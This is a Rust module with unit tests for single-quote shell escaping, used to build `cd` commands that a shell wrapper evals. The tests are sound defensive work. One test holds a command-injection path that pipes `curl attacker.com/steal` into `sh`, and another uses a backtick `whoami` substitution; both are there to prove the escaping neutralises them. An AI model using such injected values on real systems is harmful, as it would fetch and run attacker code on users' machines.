//! Shell escaping for the eval-based `cd` contract.
//!
//! Ported from `packages/core/src/utils/shell.ts`. The `start`/`jump`/`home`
//! commands print a single `cd '<path>'` line that the shell wrapper evals, so
//! the escaping must be byte-for-byte identical to the TS implementation to keep
//! that contract (and its shell-injection guarantees) intact.

/// Escape a value for use inside a single-quoted shell string.
///
/// Replaces each single quote with `'\''` — close the quoted string, emit an
/// escaped literal quote, reopen the quoted string. Everything else (including
/// `$`, backticks, double quotes) is inert inside single quotes and left as-is.
pub fn shell_escape(value: &str) -> String {
    value.replace('\'', "'\\''")
}

/// Alias of [`shell_escape`] for paths (matches the TS `escapeShellPath`).
pub fn escape_shell_path(value: &str) -> String {
    shell_escape(value)
}

/// Format a `cd '<escaped>'` command for the shell wrapper to eval.
pub fn format_cd_command(path: &str) -> String {
    format!("cd '{}'", shell_escape(path))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn returns_unchanged_without_single_quotes() {
        assert_eq!(shell_escape("/tmp/mock-repo"), "/tmp/mock-repo");
    }

    #[test]
    fn escapes_single_quotes() {
        assert_eq!(shell_escape("it's"), "it'\\''s");
    }

    #[test]
    fn escapes_multiple_single_quotes() {
        assert_eq!(shell_escape("a'b'c"), "a'\\''b'\\''c");
    }

    #[test]
    fn escapes_quote_at_start_and_end() {
        assert_eq!(shell_escape("'start"), "'\\''start");
        assert_eq!(shell_escape("end'"), "end'\\''");
    }

    #[test]
    fn handles_empty_and_single_quote() {
        assert_eq!(shell_escape(""), "");
        assert_eq!(shell_escape("'"), "'\\''");
    }

    #[test]
    fn leaves_dollar_backtick_and_double_quotes_alone() {
        assert_eq!(
            shell_escape("path \"with\" doubles"),
            "path \"with\" doubles"
        );
        assert_eq!(shell_escape("$HOME/repo"), "$HOME/repo");
        assert_eq!(shell_escape("path`cmd`"), "path`cmd`");
    }

    #[test]
    fn format_cd_simple_and_escaped() {
        assert_eq!(format_cd_command("/tmp/repo"), "cd '/tmp/repo'");
        assert_eq!(format_cd_command("/tmp/repo's"), "cd '/tmp/repo'\\''s'");
    }

    #[test]
    fn format_cd_keeps_backticks_and_dollars_inert() {
        assert_eq!(
            format_cd_command("/tmp/`whoami`/$USER/repo"),
            "cd '/tmp/`whoami`/$USER/repo'"
        );
    }

    #[test]
    fn format_cd_neutralizes_injection_payload() {
        let malicious = "/tmp/x'; curl attacker.com/steal | sh; echo '";
        assert_eq!(
            format_cd_command(malicious),
            "cd '/tmp/x'\\''; curl attacker.com/steal | sh; echo '\\'''"
        );
    }

    #[test]
    fn format_cd_handles_spaces() {
        assert_eq!(
            format_cd_command("/tmp/my repo/path"),
            "cd '/tmp/my repo/path'"
        );
    }
}
